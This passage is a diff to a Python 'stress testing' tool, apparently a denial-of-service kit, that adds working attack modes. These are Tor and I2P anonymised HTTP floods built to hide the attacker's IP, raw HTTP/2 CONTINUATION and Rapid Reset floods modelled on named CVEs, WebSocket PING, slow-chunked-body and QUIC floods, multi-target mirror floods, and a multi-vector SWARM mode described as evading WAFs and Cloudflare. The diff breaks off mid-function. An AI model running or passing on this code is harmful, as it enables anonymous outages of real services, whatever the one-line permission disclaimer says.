@@ -8,7 +8,7 @@ MEOW-SEC :: STRESS — Load & Stress Testing
   · Proxy rotation intégrée sur TOUTES les méthodes
   Use ONLY on systems you own or have explicit written permission to test.
 """
-import os, sys, time, socket, threading, random, string, ssl
+import os, sys, time, socket, threading, random, string, ssl, struct
 import concurrent.futures
 from datetime import datetime
 from urllib.parse import urlparse
@@ -849,6 +849,282 @@ def _worker_icmp(host: str, stats: Stats):
         except Exception:
             stats.hit(False)
 
+# ─── SPECTER — Tor Anonymous Flood ──────────────────────────
+
+_TOR_SOCKS      = {"http": "socks5://127.0.0.1:9050",
+                   "https": "socks5://127.0.0.1:9050"}
+_TOR_CTRL_PORT  = 9051
+
+
+def _tor_available() -> bool:
+    """Vérifie si le daemon Tor tourne sur 127.0.0.1:9050."""
+    try:
+        s = socket.socket()
+        s.settimeout(2)
+        s.connect(("127.0.0.1", 9050))
+        s.close()
+        return True
+    except Exception:
+        return False
+
+
+def _tor_get_exit_ip() -> str:
+    """Retourne l'IP de sortie Tor actuelle via check.torproject.org."""
+    try:
+        r = _req.get("https://check.torproject.org/api/ip",
+                     proxies=_TOR_SOCKS, timeout=10, verify=False)
+        data = r.json()
+        return data.get("IP", "?")
+    except Exception:
+        return "?"
+
+
+def _tor_new_circuit() -> bool:
+    """
+    Demande un nouveau circuit Tor via le Control Port 9051.
+    Requiert stem + HashedControlPassword ou CookieAuthentication dans torrc.
+    Retourne True si succès, False si stem absent ou ctrl port fermé.
+    """
+    try:
+        from stem import Signal
+        from stem.control import Controller
+        with Controller.from_port(port=_TOR_CTRL_PORT) as ctrl:
+            ctrl.authenticate()          # tente cookie puis password vide
+            ctrl.signal(Signal.NEWNYM)
+            return True
+    except Exception:
+        return False
+
+
+def _worker_specter(url: str, stats: Stats, ua_list: list,
+                    renew_every: int,
+                    circuit_lock: threading.Lock,
+                    request_counter: list,
+                    exit_ip_ref: list):
+    """
+    SPECTER — Flood entièrement anonymisé via réseau Tor.
+
+    Architecture :
+      Attaquant → Tor Guard → Tor Middle → Tor Exit → Cible
+      La cible ne voit QUE l'adresse de l'exit node Tor.
+      L'IP d'origine n'apparaît nulle part dans les logs du serveur.
+
+    Circuit renewal :
+      Toutes les `renew_every` requêtes (coordonné entre tous les workers),
+      un seul worker déclenche NEWNYM → nouveau circuit → nouvel exit IP.
+      Les autres workers recréent leurs sessions pour forcer le nouveau circuit.
+    """
+    session = _req.Session()
+    local_count = 0
+
+    while not _STOP.is_set():
+        # ── Décision de renouvellement (coordonné) ────────────────
+        do_renew = False
+        with circuit_lock:
+            request_counter[0] += 1
+            if request_counter[0] % renew_every == 0:
+                do_renew = True
+
+        if do_renew:
+            renewed = _tor_new_circuit()
+            if renewed:
+                # Attendre que le nouveau circuit soit établi
+                time.sleep(1.2)
+                # Rafraîchir l'exit IP affiché
+                try:
+                    new_ip = _tor_get_exit_ip()
+                    exit_ip_ref[0] = new_ip
+                except Exception:
+                    pass
+            # Nouvelle session pour coller au nouveau circuit
+            session = _req.Session()
+
+        t0 = time.perf_counter()
+        try:
+            r = session.get(
+                url,
+                headers={
+                    "User-Agent":      random.choice(ua_list),
+                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Cache-Control":   "no-cache",
+                    "Connection":      "close",
+                    "X-Request-ID":    _rand_str(16),
+                },
+                proxies=_TOR_SOCKS,
+                timeout=25,          # Tor est lent → timeout plus long
+                allow_redirects=False,
+                verify=False,
+            )
+            elapsed = time.perf_counter() - t0
+            stats.hit(r.status_code < 500, elapsed * 1000, len(r.content))
+        except Exception:
+            stats.hit(False)
+
+        local_count += 1
+
+
+# ─── WRAITH — I2P Anonymous Flood ────────────────────────────
+
+_I2P_HTTP_PROXY = {"http":  "http://127.0.0.1:4444",
+                   "https": "http://127.0.0.1:4444"}
+
+
+def _i2p_available() -> bool:
+    """Vérifie si le proxy HTTP I2P tourne sur 127.0.0.1:4444."""
+    try:
+        s = socket.socket()
+        s.settimeout(2)
+        s.connect(("127.0.0.1", 4444))
+        s.close()
+        return True
+    except Exception:
+        return False
+
+
+def _i2p_get_router_info() -> str:
+    """Récupère l'état du routeur I2P via son API REST (port 7657)."""
+    try:
+        r = _req.get("http://127.0.0.1:7657/jsonrpc/", timeout=3,
+                     json={"id": 1, "method": "RouterInfo", "params": []})
+        return r.json().get("result", {}).get("version", "?")
+    except Exception:
+        return "?"
+
+
+def _worker_wraith(url: str, stats: Stats, ua_list: list):
+    """
+    WRAITH — Flood via réseau I2P (garlic routing).
+
+    Architecture :
+      Attaquant → Tunnel I2P inbound → Outproxy I2P → Cible
+      Garlic routing = plusieurs messages bundlés dans un "bulb"
+      L'outproxy voit une IP I2P, la cible voit l'outproxy — jamais l'origine.
+
+    Avantages vs Tor :
+      · Pool d'IPs différent — les blocklists Tor ne fonctionnent pas
+      · Garlic routing rend l'analyse de trafic plus difficile que onion
+      · Tunnels P2P régénérés automatiquement toutes les 10 min
+      · Quasi inconnu des WAF/CDN — rarement filtré
+      · Pas besoin de gestion manuelle des circuits
+
+    Requiert I2P installé avec proxy HTTP sur 127.0.0.1:4444.
+    """
+    session = _req.Session()
+
+    while not _STOP.is_set():
+        t0 = time.perf_counter()
+        try:
+            r = session.get(
+                url,
+                headers={
+                    "User-Agent":      random.choice(ua_list),
+                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Cache-Control":   "no-cache",
+                    "Connection":      "close",
+                    "X-Request-ID":    _rand_str(16),
+                },
+                proxies=_I2P_HTTP_PROXY,
+                timeout=30,      # I2P est lent mais plus stable que Tor
+                allow_redirects=False,
+                verify=False,
+            )
+            elapsed = time.perf_counter() - t0
+            stats.hit(r.status_code < 500, elapsed * 1000, len(r.content))
+        except Exception:
+            stats.hit(False)
+
+
+# ─── MIRROR HELPERS ──────────────────────────────────────────
+
+class _MirrorCycle:
+    """
+    Distributeur thread-safe de cibles en round-robin.
+    Chaque worker appelle .next() pour obtenir la prochaine URL/host.
+    """
+    def __init__(self, targets: list):
+        self._t   = list(targets)
+        self._idx = 0
+        self._lk  = threading.Lock()
+
+    def next(self) -> str:
+        with self._lk:
+            v = self._t[self._idx % len(self._t)]
+            self._idx += 1
+            return v
+
+    def random(self) -> str:
+        return random.choice(self._t)
+
+    def __len__(self):
+        return len(self._t)
+
+
+def _worker_http_mirror(mirror: _MirrorCycle, stats: Stats, use_proxy: bool,
+                        ua_list: list, use_cffi: bool = False):
+    """
+    L7 Mirror — GET flood sur plusieurs URLs en rotation round-robin.
+    Chaque requête part vers une cible différente.
+    Incompatible avec keep-alive (Connection: close forcé) → force new session.
+    """
+    while not _STOP.is_set():
+        url = mirror.next()
+        session = _make_session(use_cffi)
+        t0 = time.perf_counter()
+        try:
+            r = session.get(
+                url,
+                headers={
+                    "User-Agent":      random.choice(ua_list),
+                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control":   "no-cache, no-store",
+                    "Pragma":          "no-cache",
+                    "Connection":      "close",
+                    "X-Request-ID":    _rand_str(16),
+                },
+                proxies=_get_proxy() if use_proxy else None,
+                timeout=8, allow_redirects=False, verify=False,
+            )
+            elapsed = time.perf_counter() - t0
+            stats.hit(r.status_code < 500, elapsed * 1000, len(r.content))
+        except Exception:
+            stats.hit(False)
+
+
+def _worker_icmp_mirror(mirror: _MirrorCycle, stats: Stats):
+    """
+    L3 Mirror — ICMP flood sur plusieurs hôtes en rotation round-robin.
+    """
+    import subprocess
+    while not _STOP.is_set():
+        host = mirror.next()
+        try:
+            cmd = ["ping", "-n", "1", "-w", "500", host] if os.name == "nt" \
+                  else ["ping", "-c", "1", "-W", "1", host]
+            r = subprocess.run(cmd, capture_output=True, timeout=3)
+            stats.hit(r.returncode == 0)
+        except Exception:
+            stats.hit(False)
+
+
+def _worker_udp_mirror(mirror: _MirrorCycle, port: int, stats: Stats):
+    """L4 Mirror — UDP flood sur plusieurs hôtes en rotation."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while not _STOP.is_set():
+        host = mirror.next()
+        try:
+            payload = os.urandom(random.randint(64, 1024))
+            sock.sendto(payload, (host, port))
+            stats.hit(True, nbytes=len(payload))
+        except Exception:
+            stats.hit(False)
+    sock.close()
+
+
 # ─── UTILS ───────────────────────────────────────────────────
 
 def _rand_str(n: int) -> str:
@@ -870,6 +1146,324 @@ UA_LIST = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
 ]
 
+# ─── H2 FRAME PRIMITIVES ─────────────────────────────────────
+
+def _h2_frame_raw(type_id: int, flags: int, stream_id: int,
+                  payload: bytes = b"") -> bytes:
+    """Construct a raw HTTP/2 frame (RFC 7540 §4.1)."""
+    ln = len(payload)
+    return (
+        struct.pack(">I", ln)[1:4]
+        + bytes([type_id, flags])
+        + struct.pack(">I", stream_id & 0x7FFFFFFF)
+        + payload
+    )
+
+_H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+
+def _h2_hpack_headers(host: str, ua: str = "Mozilla/5.0") -> bytes:
+    """
+    Minimal HPACK (static-table only, no Huffman) for a basic GET /.
+    Static table: [2]=:method GET  [4]=:path /  [7]=:scheme https  [1]=:authority.
+    """
+    encoded = bytes([0x82, 0x84, 0x87])
+    host_b  = host.encode("utf-8", errors="replace")[:250]
+    encoded += bytes([0x41]) + bytes([len(host_b)]) + host_b
+    ua_b    = ua.encode("utf-8", errors="replace")[:250]
+    name_b  = b"user-agent"
+    encoded += (bytes([0x00]) + bytes([len(name_b)]) + name_b
+                + bytes([len(ua_b)]) + ua_b)
+    return encoded
+
+
+def _h2_hpack_junk(n: int = 5) -> bytes:
+    """Generate n random HPACK literal headers (new name, no indexing) for spam."""
+    out = b""
+    for _ in range(n):
+        k = f"x-{_rand_str(8)}".encode()
+        v = os.urandom(16).hex().encode()
+        out += bytes([0x00]) + bytes([len(k)]) + k + bytes([len(v)]) + v
+    return out
+
+
+# ─── H2_CONTINUATION — HTTP/2 CONTINUATION Frame Flood ───────
+#
+#  CVE-2024-27316 style.
+#  HEADERS with END_HEADERS=0 forces the server to buffer every subsequent
+#  CONTINUATION frame until it sees END_HEADERS.  Sending 3 000+
+#  CONTINUATION frames per connection → server OOM / thread starvation on
+#  unpatched Apache httpd, nginx <1.25.3, IIS, and many others.
+
+def _worker_h2_continuation(host: str, port: int, stats: Stats,
+                             ua_list: list):
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode    = ssl.CERT_NONE
+    try: ctx.set_alpn_protocols(["h2"])
+    except Exception: pass
+
+    while not _STOP.is_set():
+        raw = tls_c = None
+        try:
+            raw   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            raw.settimeout(10)
+            raw.connect((host, port))
+            tls_c = ctx.wrap_socket(raw, server_hostname=host)
+
+            hdrs = _h2_hpack_headers(host, random.choice(ua_list))
+            tls_c.sendall(_H2_PREFACE)
+            tls_c.sendall(_h2_frame_raw(0x4, 0x0, 0))        # SETTINGS empty
+            tls_c.sendall(_h2_frame_raw(0x1, 0x0, 1, hdrs))  # HEADERS no END_HEADERS
+
+            sent = 0
+            for i in range(3000):
+                if _STOP.is_set(): break
+                tls_c.sendall(_h2_frame_raw(0x9, 0x0, 1, _h2_hpack_junk(5)))
+                sent += 1
+                if sent % 200 == 0:
+                    time.sleep(0.001)
+            stats.hit(True, nbytes=sent * 50)
+        except Exception:
+            stats.hit(False)
+        finally:
+            for c in (tls_c, raw):
+                try:
+                    if c: c.close()
+                except Exception: pass
+
+
+# ─── H2_RST — HTTP/2 Rapid Reset Storm ───────────────────────
+#
+#  CVE-2023-44487 style — opens N streams per TCP connection then
+#  immediately RST_STREAMs each one.  Per-stream alloc/dealloc cycles
+#  → CPU thrashing on the server.
+
+def _worker_h2_rst(host: str, port: int, stats: Stats, ua_list: list):
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode    = ssl.CERT_NONE
+    try: ctx.set_alpn_protocols(["h2"])
+    except Exception: pass
+
+    settings_payload = (struct.pack(">HI", 0x4, 65535) +
+                        struct.pack(">HI", 0x5, 16777215))
+
+    while not _STOP.is_set():
+        raw = tls_c = None
+        try:
+            raw   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            raw.settimeout(8)
+            raw.connect((host, port))
+            tls_c = ctx.wrap_socket(raw, server_hostname=host)
+
+            tls_c.sendall(_H2_PREFACE)
+            tls_c.sendall(_h2_frame_raw(0x4, 0x0, 0, settings_payload))
+            hdrs = _h2_hpack_headers(host, random.choice(ua_list))
+
+            for sid in range(1, 201, 2):
+                if _STOP.is_set(): break
+                tls_c.sendall(_h2_frame_raw(0x1, 0x4, sid, hdrs))
+                tls_c.sendall(_h2_frame_raw(0x3, 0x0, sid,
+                                            struct.pack(">I", 0x8)))
+                stats.hit(True, nbytes=50)
+                if sid % 40 == 1: time.sleep(0.001)
+        except Exception:
+            stats.hit(False)
+        finally:
+            for c in (tls_c, raw):
+                try:
+                    if c: c.close()
+                except Exception: pass
+
+
+# ─── WS_FLOOD — WebSocket PING Flood ─────────────────────────
+#
+#  RFC 6455 §5.5.2 mandates servers MUST respond to every PING with PONG.
+#  Hundreds of PINGs/s per connection → server parse + queue overhead.
+
+def _ws_ping_frame() -> bytes:
+    mask    = os.urandom(4)
+    payload = os.urandom(4)
+    masked  = bytes(payload[i] ^ mask[i % 4] for i in range(4))
+    return bytes([0x89, 0x84]) + mask + masked
+
+
+def _ws_upgrade(host: str, port: int, path: str, use_ssl: bool):
+    import base64 as _b64
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(10)
+    try:
+        s.connect((host, port))
+        if use_ssl:
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx.check_hostname = False
+            ctx.verify_mode    = ssl.CERT_NONE
+            s = ctx.wrap_socket(s, server_hostname=host)
+        key = _b64.b64encode(os.urandom(16)).decode()
+        s.sendall((
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+            f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
+            f"User-Agent: Mozilla/5.0\r\n\r\n"
+        ).encode())
+        buf = b""
+        while b"\r\n\r\n" not in buf:
+            chunk = s.recv(1024)
+            if not chunk: break
+            buf += chunk
+        if b"101" in buf: return s
+        s.close(); return None
+    except Exception:
+        try: s.close()
+        except: pass
+        return None
+
+
+def _worker_ws_flood(host: str, port: int, path: str, use_ssl: bool,
+                     stats: Stats):
+    """WebSocket PING flood — RFC 6455 mandates server PONG on every PING."""
+    ping = _ws_ping_frame()
+    while not _STOP.is_set():
+        ws = _ws_upgrade(host, port, path, use_ssl)
+        if ws is None:
+            stats.hit(False); time.sleep(0.5); continue
+        try:
+            ws.settimeout(5)
+            while not _STOP.is_set():
+                ws.sendall(ping)
+                stats.hit(True, nbytes=10)
+                try: ws.recv(32)
+                except Exception: break
+                time.sleep(0.01)
+        except Exception:
+            stats.hit(False)
+        finally:
+            try: ws.close()
+            except: pass
+
+
+# ─── SLOW_CHUNK — Chunked Transfer Slow Body ─────────────────
+#
+#  Improved RUDY: Transfer-Encoding: chunked instead of Content-Length.
+#  Server cannot predict body size → bypasses Content-Length-based RUDY
+#  defenses.  Sends one 1-byte chunk every ~500ms, never the "0\r\n\r\n"
+#  terminator → connection held open indefinitely.
+
+def _worker_slow_chunk(host: str, port: int, path: str, use_ssl: bool,
+                       stats: Stats, ua_list: list):
+    """Chunked slow body — server waits forever for the terminating 0 chunk."""
+    while not _STOP.is_set():
+        conn = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(120)
+            s.connect((host, port))
+            if use_ssl:
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx.check_hostname = False
+                ctx.verify_mode    = ssl.CERT_NONE
+                conn = ctx.wrap_socket(s, server_hostname=host)
+            else:
+                conn = s
+            ua  = random.choice(ua_list)
+            req = (
+                f"POST {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"User-Agent: {ua}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
+            )
+            conn.sendall(req.encode())
+            stats.hit(True, nbytes=len(req))
+            while not _STOP.is_set():
+                chunk = f"1\r\n{random.choice(string.ascii_lowercase)}\r\n"
+                conn.sendall(chunk.encode())
+                stats.hit(True, nbytes=4)
+                time.sleep(random.uniform(0.4, 0.6))
+        except Exception:
+            stats.hit(False)
+        finally:
+            try:
+                if conn: conn.close()
+            except Exception: pass
+
+
+# ─── QUIC_FLOOD — UDP/QUIC HTTP3 Flood ───────────────────────
+#
+#  QUIC (RFC 9000) runs on UDP/443 — far less protected than TCP on most
+#  firewalls.  Sends QUIC Initial packets forcing version-negotiation CPU
+#  overhead on servers with HTTP/3 (Cloudflare, nginx ≥1.25, Caddy, etc.)
+
+def _worker_quic_flood(host: str, port: int, stats: Stats):
+    """QUIC Initial packet flood (RFC 9000) — UDP, forces version-negotiation."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        while not _STOP.is_set():
+            try:
+                plen   = random.randint(1200, 1350)
+                packet = (
+                    bytes([0xC0])
+                    + struct.pack(">I", 0x00000001)
+                    + bytes([0x08]) + os.urandom(8)
+                    + bytes([0x08]) + os.urandom(8)
+                    + bytes([0x00])
+                    + struct.pack(">H", 0x4000 | (plen + 4))
+                    + bytes([random.randint(0, 127)])
+                    + os.urandom(plen)
+                )
+                sock.sendto(packet, (host, port))
+                stats.hit(True, nbytes=len(packet))
+            except Exception:
+                stats.hit(False)
+    finally:
+        sock.close()
+
+
+# ─── PHANTOM_MIX — Tor + I2P Rotating Anon Flood ─────────────
+#
+#  Combines SPECTER (Tor) and WRAITH (I2P) in a single worker.
+#  Requests alternate between the two networks at random (50/50 when both
+#  available).  Two distinct exit IP pools → blocking one doesn't stop the
+#  other.  Auto-falls back to whichever anonymizer is still reachable.
+
+def _worker_phantom_mix(url: str, stats: Stats, ua_list: list):
+    """Tor + I2P rotating flood — two anonymous exit pools, auto-fallback."""
+    tor_ok = _tor_available()
+    i2p_ok = _i2p_available()
+    if not tor_ok and not i2p_ok:
+        err("PHANTOM_MIX: ni Tor ni I2P détecté — impossible de démarrer")
+        return
+    session = _req.Session()
+    while not _STOP.is_set():
+        if tor_ok and i2p_ok:
+            proxy = _TOR_SOCKS if random.random() < 0.5 else _I2P_HTTP_PROXY
+        elif tor_ok:
+            proxy = _TOR_SOCKS
+        else:
+            proxy = _I2P_HTTP_PROXY
+        timeout = 25 if proxy is _TOR_SOCKS else 30
+        t0 = time.perf_counter()
+        try:
+            r = session.get(
+                url,
+                headers={
+                    "User-Agent":    random.choice(ua_list),
+                    "Accept":        "text/html,application/xhtml+xml,*/*;q=0.8",
+                    "Cache-Control": "no-cache",
+                    "Connection":    "close",
+                    "X-Request-ID":  _rand_str(16),
+                },
+                proxies=proxy, timeout=timeout,
+                allow_redirects=False, verify=False,
+            )
+            stats.hit(r.status_code < 500, (time.perf_counter()-t0)*1000, len(r.content))
+        except Exception:
+            stats.hit(False)
+            if proxy is _TOR_SOCKS and not _tor_available():         tor_ok = False
+            elif proxy is _I2P_HTTP_PROXY and not _i2p_available(): i2p_ok = False
+
+
 def _parse_target(target: str) -> tuple:
     if "://" not in target:
         target = "http://" + target
@@ -878,19 +1472,128 @@ def _parse_target(target: str) -> tuple:
     port = p.port or (443 if p.scheme == "https" else 80)
     return host, port, target
 
+# ─── SWARM — Multi-Vector Simultaneous Attack ────────────────
+#
+#  Splits workers across 5 attack vectors simultaneously.
+#  No single mitigation strategy can stop all vectors at once.
+#  Closest to botnet-level devastation achievable from one machine.
+#
+#  Distribution:
+#    30% HTTP_BYPASS   — WAF/CDN cache-bust evasion
+#    25% PULSAR        — synchronized burst waves (sature accept() OS)
+#    20% HTTP_COOKIE   — session store exhaustion
+#    15% SLOWLORIS     — connection slot exhaustion
+#    10% TLS           — per-connection crypto overhead
+
+def _run_swarm(target: str, workers: int, duration: int,
+               use_proxy: bool, use_cffi: bool = False):
+    stats = Stats()
+    _STOP.clear()
+    host, port, url = _parse_target(target)
+
+    if use_proxy:
+        alive = _proxy_healthcheck(url, sample=50, timeout=4)
+        if alive == 0:
+            warn("Aucun proxy vivant — SWARM sans proxy.")
+            use_proxy = False
+
+    base_lat     = _calibrate_resonance(url, use_proxy, n=3)
+    pulsar_sleep = [max(0.05, base_lat * 0.40)]
+
+    w_bypass = max(1, int(workers * 0.30))
+    w_pulsar = max(1, int(workers * 0.25))
+    w_cookie = max(1, int(workers * 0.20))
+    w_slow   = max(1, int(workers * 0.15))
+    w_tls    = max(1, workers - w_bypass - w_pulsar - w_cookie - w_slow)
+    pulsar_barrier = threading.Barrier(w_pulsar, timeout=6)
+
+    ok(f"[bold {G1}]SWARM[/] — [{G1}]{workers}[/] workers / 5 vecteurs simultanés :")
+    console.print(f"  [{OR}]HTTP_BYPASS[/]  {w_bypass:>3} workers  (WAF/CDN evasion)")
+    console.print(f"  [{OR}]PULSAR[/]       {w_pulsar:>3} workers  (synchronized bursts)")
+    console.print(f"  [{OR}]HTTP_COOKIE[/]  {w_cookie:>3} workers  (session store flood)")
+    console.print(f"  [{OR}]SLOWLORIS[/]    {w_slow:>3} workers  (connection slots)")
+    console.print(f"  [{OR}]TLS[/]          {w_tls:>3} workers  (handshake overhead)")
+    console.print()
+
+    threads = []
+    for _ in range(w_bypass):
+        t = threading.Thread(target=_worker_http_bypass,
+                             args=(url, stats, use_proxy, UA_LIST), daemon=True)
+        t.start(); threads.append(t)
+    for _ in range(w_pulsar):
+        t = threading.Thread(target=_worker_pulsar,
+                             args=(url, stats, use_proxy, UA_LIST,
+                                   pulsar_barrier, pulsar_sleep, use_cffi), daemon=True)
+        t.start(); threads.append(t)
+    for _ in range(w_cookie):
+        t = threading.Thread(target=_worker_http_cookie,
+                             args=(url, stats, use_proxy, UA_LIST), daemon=True)
+        t.start(); threads.append(t)
+    for _ in range(w_slow):
+        t = threading.Thread(target=_worker_slowloris,
+                             args=(host, port, stats, use_proxy), daemon=True)
+        t.start(); threads.append(t)
+    for _ in range(w_tls):
+        t = threading.Thread(target=_worker_tls,
+                             args=(host, port, stats, use_proxy), daemon=True)
+        t.start(); threads.append(t)
+
+    swarm_label = (f"BYPASS×{w_bypass} PULSAR×{w_pulsar} "
+                   f"COOKIE×{w_cookie} SLOW×{w_slow} TLS×{w_tls}")
+    end_time = time.time() + duration
+    try:
+        with Live(console=console, refresh_per_second=4) as live:
+            while time.time() < end_time and not _STOP.is_set():
+                remaining = max(0, end_time - time.time())
+                tbl = stats.render_table(target, "SWARM", True)
+                live.update(Panel(
+                    tbl,
+                    title=(f"[bold {RD}]◈ MEOW-STRESS :: SWARM ◈  "
+                           f"[{OR}]{remaining:.0f}s remaining[/]"),
+                    subtitle=f"[{G1}]MULTI-VECTOR[/]  [{CY}]{swarm_label}[/]",
+                    border_style=RD,
+                ))
+                time.sleep(0.25)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        _STOP.set()
+        try: pulsar_barrier.abort()
+        except: pass
+
+    console.print()
+    console.print(Panel(
+        stats.render_table(target, "SWARM", False),
+        title=f"[bold {G1}]◈ ATTACK COMPLETE ◈",
+        border_style=G2
+    ))
+    _save_results(target, "SWARM", stats, workers, duration)
+
+
 # ─── LIVE DISPLAY ────────────────────────────────────────────
 
 def _run_attack(target: str, method: str, workers: int, duration: int,
-                use_proxy: bool, use_cffi: bool = False):
+                use_proxy: bool, use_cffi: bool = False,
+                extra_targets: list | None = None):
+    """
+    extra_targets : liste de cibles supplémentaires pour le mirror mode.
+    Si fournie, le worker HTTP_MIRROR / ICMP_MIRROR / UDP_MIRROR est utilisé
+    et les requêtes tournent sur toutes les cibles (target inclus) en round-robin.
+    """
     stats = Stats()
     _STOP.clear()
 
     host, port, url = _parse_target(target)
     parsed_path = urlparse(url).path or "/"
+    use_ssl     = url.startswith("https://")
+
+    # ── Mirror mode ──────────────────────────────────────────────
+    mirror_targets_raw = [target] + (extra_targets or [])
+    mirror_mode = len(mirror_targets_raw) > 1
 
     HTTP_METHODS = {"HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS",
                     "HTTP_JSON","HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED",
-                    "RESONANCE","PULSAR"}
+                    "RESONANCE","PULSAR","SPECTER","WRAITH","PHANTOM_MIX"}
     SOCKET_METHODS = {"SLOWLORIS","RUDY","TLS","TCP"}
 
     if method in HTTP_METHODS and not HAS_REQUESTS and not HAS_CFFI:
@@ -903,6 +1606,66 @@ def _run_attack(target: str, method: str, workers: int, duration: int,
 
     if use_cffi:
         ok(f"[bold {G1}]curl_cffi mode[/] — TLS fingerprint = Chrome (Cloudflare bypass actif)")
+
+    # ── SPECTER : vérification Tor + init ─────────────────────
+    specter_lock    = None
+    specter_counter = None
+    specter_exit_ip = None
+    specter_renew   = None
+    if method == "SPECTER":
+        if not _tor_available():
+            err("Tor n'est pas détecté sur 127.0.0.1:9050 !")
+            console.print()
+            info("Pour utiliser SPECTER, Tor doit tourner localement :")
+            console.print(f"  [{CY}]Windows :[/] installe Tor Browser — ouvre-le → Tor tourne automatiquement")
+            console.print(f"  [{CY}]Linux   :[/] sudo apt install tor && sudo systemctl start tor")
+            console.print(f"  [{CY}]macOS   :[/] brew install tor && brew services start tor")
+            console.print()
+            info("Circuit renewal automatique via stem (optionnel) :")
+            console.print(f"  [{CY}]pip install stem[/]")
+            console.print(f"  [{DM}]Puis activer le Control Port dans torrc :[/]")
+            console.print(f"  [{DM}]ControlPort 9051[/]")
+            console.print(f"  [{DM}]CookieAuthentication 1[/]")
+            return
+        info(f"Tor détecté sur [{G1}]127.0.0.1:9050[/] — récupération de l'exit IP...")
+        initial_exit = _tor_get_exit_ip()
+        ok(f"Exit IP actuelle : [{G1}]{initial_exit}[/]")
+        specter_exit_ip = [initial_exit]
+        specter_lock    = threading.Lock()
+        specter_counter = [0]
+        specter_renew   = workers * 3   # renouveler après workers×3 requêtes totales
+        ok(f"Circuit renewal : toutes les [{G1}]{specter_renew}[/] requêtes")
+        console.print()
+
+    # ── PHANTOM_MIX : vérification Tor + I2P ────────────────────
+    if method == "PHANTOM_MIX":
+        tor_ok = _tor_available()
+        i2p_ok = _i2p_available()
+        if not tor_ok and not i2p_ok:
+            err("PHANTOM_MIX : ni Tor ni I2P détecté !")
+            console.print()
+            info("Pour utiliser PHANTOM_MIX, Tor et/ou I2P doivent tourner localement.")
+            console.print(f"  [{CY}]Tor  :[/] Tor Browser (Windows) / sudo systemctl start tor (Linux)")
+            console.print(f"  [{CY}]I2P  :[/] https://geti2p.net/en/download  → proxy HTTP 127.0.0.1:4444")
+            return
+        modes = (["Tor"] if tor_ok else []) + (["I2P"] if i2p_ok else [])
+        ok(f"PHANTOM_MIX : [{G1}]{' + '.join(modes)}[/] détecté — rotation aléatoire entre les réseaux")
+        console.print()
+
+    # ── WRAITH : vérification I2P ─────────────────────────────
+    if method == "WRAITH":
+        if not _i2p_available():
+            err("I2P n'est pas détecté sur 127.0.0.1:4444 !")
+            console.print()
+            info("Pour utiliser WRAITH, I2P doit tourner avec le proxy HTTP activé :")
+            console.print(f"  [{CY}]Windows/Linux/macOS :[/] télécharge I2P → https://geti2p.net/en/download")
+            console.print(f"  [{CY}]Linux :[/] sudo apt install i2p && i2prouter start")
+            console.print(f"  [{DM}]Puis dans la console I2P (http://127.0.0.1:7657) :[/]")
+            console.print(f"  [{DM}]→ Tunnel Manager → HTTP Proxy → Port 4444 → Activer[/]")
+            return
+        info(f"I2P détecté sur [{G1}]127.0.0.1:4444[/] — garlic routing actif")
+        ok(f"Tunnels I2P en cours de construction (peut prendre 1-2 min au démarrage)...")
+        console.print()
 
     # ── PROXY HEALTHCHECK avant l'attaque ──────────────────────
     if use_proxy:
@@ -937,9 +1700,38 @@ def _run_attack(target: str, method: str, workers: int, duration: int,
             ok(f"Cloudflare bypass: [{G1}]ACTIVE[/] (curl_cffi Chrome TLS fingerprint)")
         console.print()
 
+    # ── Construire le MirrorCycle si mirror mode ─────────────────
+    # Pour L7 HTTP : on normalise chaque cible en URL complète
+    # Pour L3/L4   : on extrait les hosts
+    mirror_http = None
+    mirror_l3   = None
+    if mirror_mode:
+        http_urls   = [_parse_target(t)[2] for t in mirror_targets_raw]
+        mirror_http = _MirrorCycle(http_urls)
+        l3_hosts    = [_parse_target(t)[0] for t in mirror_targets_raw]
+        l3_port     = port
+        mirror_l3   = _MirrorCycle(l3_hosts)
+        info(f"[bold {G1}]MIRROR MODE[/] — [{G1}]{len(mirror_targets_raw)}[/] cibles : "
+             + "  ".join(f"[{CY}]{t}[/]" for t in mirror_targets_raw))
+        console.print()
+
     threads = []
     for _ in range(workers):
-        if   method == "HTTP_GET":     t = threading.Thread(target=_worker_http_get,    args=(url, stats, use_proxy, UA_LIST), daemon=True)
+        # ── Mirror override pour L7 HTTP ──────────────────────────
+        if mirror_mode and method in HTTP_METHODS - {"RESONANCE","PULSAR"}:
